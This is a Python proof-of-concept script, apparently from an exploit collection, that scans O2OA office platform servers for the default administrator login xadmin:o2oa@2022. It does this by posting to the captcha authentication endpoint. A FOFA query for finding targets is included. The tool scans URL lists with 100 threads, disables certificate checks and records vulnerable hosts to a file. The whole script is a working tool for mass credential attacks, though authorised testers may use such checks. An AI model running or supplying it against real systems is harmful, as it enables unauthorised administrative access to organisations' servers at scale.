#-*- coding: utf-8 -*-
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

#fofa:title=="O2OA"
def banner():
    test = """                 
       ___       ___                     __                                __
 ___  |_  |___  / _ |   _    _____ ___ _/ /__  ___  ___ ____ ____    _____/ /
/ _ \/ __// _ \/ __ |  | |/|/ / -_) _ `/  '_/ / _ \/ _ `(_-<(_-< |/|/ / _  / 
\___/____/\___/_/ |_|  |__,__/\__/\_,_/_/\_\ / .__/\_,_/___/___/__,__/\_,_/  
                                            /_/                              
                                                tag:o2oA weak password poc            
                                                    @version: v1.0.0   @author:cy
    """
    print(test)


def poc(target):
    url = target+"/x_organization_assemble_authentication/jaxrs/authentication/captcha?v=o2oa&lmdhh09l"
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Content-Type":"application/json;charset=UTF-8"
    }
    json={
        "credential": "xadmin",
        "password": "o2oa@2022"
    }
    cookies = {"x-token": "anonymous"}
    try:
        res = requests.post(url,headers=headers,json=json,cookies=cookies,verify=False,timeout=5).text
        if ' "type": "success"' in res:
            print(f"[+] {target} is vulable,[xadmin:o2oa@2022]")
            with open("request.txt", "a+") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} is not vulable")
    except:
        print(f"[*] {target} server error")

def main():
    banner()
    parser = argparse.ArgumentParser(description='o2oA weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open("url.txt", "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
            mp = Pool(100)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()